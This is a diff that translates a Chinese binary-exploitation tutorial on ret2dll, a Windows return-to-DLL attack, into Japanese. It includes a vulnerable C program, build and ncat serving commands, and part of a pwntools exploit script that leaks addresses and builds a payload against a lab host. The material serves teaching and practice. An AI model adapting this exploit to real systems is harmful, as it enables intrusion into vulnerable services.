@@ -1,7 +1,7 @@
-# ret2dll利用
+# ret2dll の利用
 
-原理与linux下的ret2libc类似，不过需要手动提取地址，目前pwntools不能提取exe文件地址。
-源代码如下
+原理は Linux の ret2libc と似ていますが、アドレスを手動で取り出す必要があります。現時点では pwntools は exe ファイルのアドレスを取り出せません。
+ソースコードは次のとおりです。
 ```
 #include <stdio.h>
 #include <ctype.h>
@@ -20,25 +20,25 @@ int main(void)
         fflush(stdout);
 }
 ```
-使用gcc(MinGW-W64 x86_64-ucrt-posix-seh)在windows下编译
+Windows 上で gcc(MinGW-W64 x86_64-ucrt-posix-seh)を使ってコンパイルします。
 
 `gcc "-Wl,--disable-reloc" -g -o ret2dll.exe ret2dll.c`
 
 
-## 搭建临时环境
+## 一時的な環境の構築
 
-使用ncat  `ncat -l 8080 --keep-open --exec ".\ret2dll.exe"`
+ncat を使う場合: `ncat -l 8080 --keep-open --exec ".\ret2dll.exe"`
 
-使用win_server  `win_server ./ret2dll.exe 8080`
+win_server を使う場合: `win_server ./ret2dll.exe 8080`
 
-exp如下
+exp は次のとおりです。
 ```python
 from pwn import *
 
 context.log_level='debug'
 context.arch='amd64'
-p=remote("192.168.0.190",8080)#这里替换为windows的ip
-main_addr=0x14000155B#手动输入地址
+p=remote("192.168.0.190",8080)#ここは Windows の IP に置き換える
+main_addr=0x14000155B#手動で入力したアドレス
 ret_addr=0x1400015D7
 puts_plt=0x140002868
 puts_got=0x14000829C
@@ -80,6 +80,6 @@ p.sendline(payload)
 p.interactive()
 ```
 
-效果如下
+実行結果は次のとおりです。
 
 ![ret2dll](./figure/ret2dll-1.png)
